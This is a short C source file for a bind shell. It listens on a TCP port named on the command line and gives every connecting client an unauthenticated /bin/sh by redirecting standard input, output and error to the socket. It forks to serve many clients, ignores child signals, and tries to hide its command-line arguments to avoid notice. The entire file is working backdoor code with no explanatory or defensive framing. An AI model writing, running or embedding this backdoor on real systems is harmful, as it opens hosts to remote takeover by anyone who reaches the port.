#include <stdlib.h>
#include <netinet/in.h>
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>


// Usage: ./bindshell [PORT]


void spawnshell(int socket_fd)
{
    dup2(socket_fd, 0);
    dup2(socket_fd, 1);
    dup2(socket_fd, 2);
    execve("/bin/sh", (char *[]){NULL}, (char *[]){NULL});
}

int main(int argc, char *argv[])
{

    int sock, socket_fd, client_len;
    struct sockaddr_in server, client;

    if (argc <= 1)
    {
        exit(1);
    }

    // Hide command line arguments
    char *arg_end;
    arg_end = argv[argc - 1] + strlen(argv[argc - 1]);
    *arg_end = ' ';

    int TCP_PORT = atoi(argv[1]);

    signal(SIGCHLD, SIG_IGN);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        exit(1);
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = htonl(INADDR_ANY);
    server.sin_port = htons(TCP_PORT);

    if (bind(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        exit(2);
    }

    listen(sock, 5);
    while (1)
    {
        client_len = sizeof(client);
        socket_fd = accept(sock, (struct sockaddr *)&client, &client_len);

        if (socket_fd < 0)
        {
            exit(3);
        }

        if (fork() == 0)
        {
            close(sock);
            spawnshell(socket_fd);
            exit(0);
        }
        else
            close(socket_fd);
    }
    return 0;
}
